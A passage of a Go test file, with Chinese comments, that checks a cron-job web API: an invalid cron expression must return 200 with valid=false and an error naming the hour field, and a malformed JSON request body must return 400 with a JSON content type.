		t.Errorf("@reboot 应是 valid + reboot + 无时间，实际 %+v", out.Preview)
	}

	// 非法表达式：表单实时校验，所以仍 200 + valid=false + 错误文案。
	rec = doJSON(t, env.server, http.MethodPost, "/api/cron/validate",
		map[string]any{"expression": "0 99 * * *"}, cookie)
	if rec.Code != http.StatusOK {
		t.Fatalf("实时校验应 200（否则用户每敲一个字符就弹一次请求失败），实际 %d", rec.Code)
	}
	var bad map[string]any
	_ = json.Unmarshal(rec.Body.Bytes(), &bad)
	if bad["valid"] != false {
		t.Errorf("非法表达式应 valid=false，实际 %v", bad)
	}
	if e, _ := bad["error"].(string); !strings.Contains(e, "小时") {
		t.Errorf("错误要指出是哪个字段，实际 %q", e)
	}
}

// ---------------------------------------------------------------------------
// ⑫ 请求体防护
// ---------------------------------------------------------------------------

func TestCronRejectsMalformedBody(t *testing.T) {
	env := newCronTestServer(t, nil)
	cookie := login(t, env.server)

	req := httptest.NewRequest(http.MethodPost, "/api/cron/jobs",
		strings.NewReader("{not json"))
	req.Header.Set("Content-Type", "application/json")
	req.AddCookie(cookie)
	rec := httptest.NewRecorder()
	env.server.handler.ServeHTTP(rec, req)
	if rec.Code != http.StatusBadRequest {
		t.Fatalf("坏 JSON 应 400，实际 %d：%s", rec.Code, rec.Body.String())
	}
	if ct := rec.Header().Get("Content-Type"); !strings.Contains(ct, "application/json") {
		t.Errorf("必须 JSON，实际 %q", ct)
	}
}
